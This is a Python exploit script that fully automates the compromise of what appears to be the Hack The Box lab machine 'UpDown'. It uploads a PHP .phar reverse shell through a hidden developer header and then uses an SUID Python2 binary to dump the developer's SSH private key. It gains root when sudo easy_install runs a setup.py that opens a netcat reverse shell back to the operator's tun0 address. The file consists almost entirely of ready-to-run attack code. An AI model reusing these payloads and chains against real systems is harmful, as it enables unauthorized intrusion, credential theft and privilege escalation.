#!/usr/bin/env python3

#===============================#
#			MY LIBRARIES		     #
#===============================#

import requests 
import sys 
from time import sleep 
from bs4 import BeautifulSoup
import netifaces
import os
from threading import Thread
import paramiko
import socket
from time import sleep



#===============================#
#			MY FUNCTIONN		     #
#===============================#

#______PARAMETERS VALIDATION________#

#check user parameters and notify to the user if a parm is missed.
def check_parms():
	help_massage = '\n[*] Usage: python3 %s [target_ip] [netcat port to listen on]'%sys.argv[0]
	try:
		# check if the user has provided the target ip.
		target = sys.argv[1]+sys.argv[2]
		# check if the user need help.
		if target == '-h' or target == '--help':
			print(help_massage)
			sys.exit(0)
	# if the user did not enterd the ip target then print the help massage.
	except IndexError:
		print(help_massage)
		sys.exit(0)


# check the connection to the target.
def check_connection():
	try:
		requests.get('http://%s'%sys.argv[1])
	except Exception:
		print('\n[*] could not established connection to the target please check you vpn connection and verify the target ip!')
		sys.exit(0)

#===========================================================#


#______FILES HANDLER________#

# function to create our loot folder.
def loot_creator():
	try:
		os.mkdir('loot')
	except FileExistsError:
		pass


# function to write file.
def write_file(file_name, content):
	with open(file_name, 'w') as my_file:
		if type(content) == list:
			my_file.writelines(content)
		else:
			my_file.write(content)


# function to read file and get the output in list or string type.
def read_file(file_name, output_type):
	with open(file_name, 'r') as my_file:
		if output_type == "list":
			return my_file.readlines()
		else:
			return my_file.read()
	

# function to remove files.
remove_files = lambda files: [os.remove(file) for file in files] if type(files) == list  else os.remove(files)

# removing the temp files and the temp folder. {waiting our exploit to done with the temp files}.
def temp_deleter():
	sleep(30)
	# deleting our temp filesa and our temp folder.
	remove_files(['loot/output.txt', 'loot/payload.txt', 'loot/developer_rsa', 'my_payload.phar'])
	os.rmdir('loot')



#===========================================================#

#______url maker and hosts file editor________#


# return a list the the desired url's amount.
def urls_maker(num):
	return ["http://192.168.0.%s\n"%str(i+1) for i in range(num)]



# adding 2 host_nmaes to the hosts file.
def hosts_file_editor(target_ip):
	# assignings the domain, subdomain into values
	domain,subdomain = 'siteisup.htb', 'dev.siteisup.htb'
	# pathing the hosts_file.
	hosts_file_path = '/etc/hosts'
	# listing the hosts_file.
	hosts_file = read_file(file_name=hosts_file_path, output_type='list')

	# check if the domain, subdomain already exists in the hosts file.if yes then replacing them with the new ip.
	check_hosts = [hosts_file.index(i) for i in hosts_file if domain in i or subdomain in i]
	if len(check_hosts) != 0:
		hosts_file[check_hosts[0]] = f"{target_ip} {domain} {subdomain}\n"
	else:
		hosts_file.insert(2, f"{target_ip} {domain} {subdomain}\n")
	
	#updateing the hosts file with the new data. 
	write_file(file_name=hosts_file_path, content=hosts_file)



#===========================================================#

#______REVERSE SHELL PAYLOADS________#


# craeting the php payload for the reverse shell.
def www_data_reverse_shell_payload(ip,port):
	return """<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s >/tmp/f');
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>"""%f'{ip} {port}'




#===========================================================#

#_______EXPLOITS_________#


# function to get shell as www-data user.
def get_www_data_shell(file_name):
	# addind the special header for getting access to the admin panel.
	special_header = {'Special-Dev': '"only4dev"'}
	file_to_upload = {'file': open(file_name, 'rb'), 'check':(None, 'check')}
	target_url = "http://dev.siteisup.htb"

	# upload_file to the target and dont wait to response.
	try:
		requests.post(url=target_url, headers=special_header, files =file_to_upload, timeout=5)
	except Exception:
		upload_folder = requests.get(url=target_url+'/uploads', headers=special_header, allow_redirects=True)

	# parsering the all href tags
	soup = BeautifulSoup(upload_folder.text, 'html.parser')
	file_directory = str(soup.find_all('a')[5]).split('"')[1][:-1]
	try:
		requests.get(target_url+'/uploads'+'/'+file_directory+'/'+file_name, headers=special_header, timeout=2)
	except Exception:
		pass


# retrieving  the ssh privet key of the developer user.
# the /home/developer/dev/siteisup is a binary of python2 progrem that run with suid of the developer user.
# the progrem take's input from the user with the input() method so we can exploit this and run command as the developer user.
# we can laek the ssh key by the input vulnerability.
# creating a file to pass our payload trough netcat reverse shell.
# parsering the output from the netcat reverse shell to get a clear ssh key.
def get_ssh_key(port):
	# writing our payload into a file to send as input to the target through the netcat reverse shell.
	my_payload = """echo '__import__("os").system("cat /home/developer/.ssh/id_rsa")'|/home/developer/dev/siteisup"""
	write_file(file_name='loot/payload.txt', content=my_payload)
	os.system(f"""echo  "{my_payload}" > loot/payload.txt;sed -i 's/(os)/("os")/g' loot/payload.txt;sed -i 's/(cat/("cat/g' loot/payload.txt;sed -i 's/id_rsa)/id_rsa")/g' loot/payload.txt;nc -nvlp {port} -w 6 < loot/payload.txt 1>loot/output.txt 2>/dev/null""")
	# storing the netcat output in a veriable.
	unparserd_ssh_key = read_file(file_name='loot/output.txt', output_type='list')
	
	# parsering the output to get only the ssh key.
	try:
		first_line_index = unparserd_ssh_key.index("$ -----BEGIN OPENSSH PRIVATE KEY-----\n") 
		last_line_index = unparserd_ssh_key.index("-----END OPENSSH PRIVATE KEY-----\n") 
	except ValueError:
		return 'again'

	# removing a char ($) from the first line.
	unparserd_ssh_key[first_line_index] = unparserd_ssh_key[first_line_index][2::]
	write_file(file_name='loot/developer_rsa',content=unparserd_ssh_key[first_line_index:last_line_index+1])
	# setting permmisions for the id_rsa file.
	os.chmod('loot/developer_rsa', 0o600)
	return 'loot/developer_rsa'


# creating our privilege escalation payload and abusing the easy_install progrem to get root privilege.
# we have permission to run the easy_install progrem with sudo privilege.
def privilege_escalation(ip,port):
	return [
	"mkdir temp",
	f"""echo "import os;os.system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f')" > temp/setup.py""",
	"sudo easy_install temp"
	]



#===========================================================#

#_______CONNECTIONS_________#

# function to connect with ssh keys and run commands on a remote system trough the ssh connection.
def ssh_connection(ssh_key_path, commands):
	remote_server,user_name, ssh_key = sys.argv[1], "developer", ssh_key_path
	commands_list = commands

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=remote_server, username=user_name, key_filename=ssh_key)
	for command in commands:
		stdin,stdout,stderr = ssh.exec_command(command)
		ssh_output = ''.join(stdout.readlines())
		print(ssh_output)
	


# creating our listiner to get a shell with stty functionality.
def root_listener(port):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind(('0.0.0.0', int(port)))
		s.listen(10)
		conn, addr = s.accept()
		full_tty_shell = """python3 -c 'import pty;pty.spawn("/bin/bash")';"""
		conn.send(full_tty_shell.encode())
		
		while True:
		   #Receive data from the target and get user input
		   ans = conn.recv(1024).decode()
		   sys.stdout.write(ans)
		   command = input()

		   #Send command
		   command += "\n"
		   conn.send(command.encode())
		   sleep(1)

		   #Remove the output of the "input()" function
		   sys.stdout.write("\033[A" + ans.split("\n")[-1])
		   

	



		
#===================================#
#			Main Function					#
#===================================#

def main():
	
	# validating the user parameters and chacking connection to the target and creating the loot folder.
	check_parms()
	check_connection()
	loot_creator()
	# assigings the remote target ip address and our listiner port to a variables.
	remote_target = sys.argv[1]
	port_listiner = sys.argv[2]
	print("\n[+] Strating the exploit for UpDown machine.")
	
	# listing our ip address and port to listen on.
	my_ip, my_port = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr'], port_listiner
	
	# naming our payload file.
	my_payload_file = 'my_payload.phar'

	# addding the domain and the sub domain to our hosts file.
	print("\n[+] Adding the domain and the subdomain to the hosts file.")
	hosts_file_editor(target_ip=remote_target)
	


	# creating our payload file.
	write_file(file_name=my_payload_file,content=urls_maker(30) + [www_data_reverse_shell_payload(ip=my_ip,port=my_port)])
	print("\n[+] Creating our payload and sending it to the remote host.")
	# uoloading the malicios file to the target and starting the malicios code on the remote server.
	Thread(target=get_www_data_shell, args=[my_payload_file]).start()
	sleep(2)
	print("\n[+] Triggering the remot host to run our payload and get shell as www-data.")
	# now we are connecting to the remote server as www-data, let's run our payload to leak the id_rsa of the developer user.
	
	id_rsa_file = get_ssh_key(my_port)
	print("\n[+] Reteiving the ssh keys for the developer user.")
	sleep(5)
	Thread(target=get_www_data_shell, args=[my_payload_file]).start()
	sleep(2)
	id_rsa_file = get_ssh_key(my_port)
	
	#start again our payload if the output file is empty.
	while id_rsa_file == 'again':
		print("\n[+] the connection to the target has been lost reconnecting to the remote targer please wait.")
		Thread(target=get_www_data_shell, args=[my_payload_file]).start()
		sleep(2)
		id_rsa_file = get_ssh_key(my_port)
	print("\n[+] preforming privilege escalation to get shell with root privilege.")

	sleep(6)
	
	# starting our lisitner.
	print("\n[+] Listening on port %s"%port_listiner)
	Thread(target=root_listener,args=[int(my_port)+1]).start()
	
	# deleting the temp files.
	Thread(target=temp_deleter).start()

	# # triggeringthe remote host to run our payload.
	print("\n[+] Starting session as root.\n\n")
	ssh_connection(ssh_key_path=id_rsa_file,commands=privilege_escalation(ip=my_ip,port=int(my_port)+1))
	

if __name__ == '__main__':
	main()
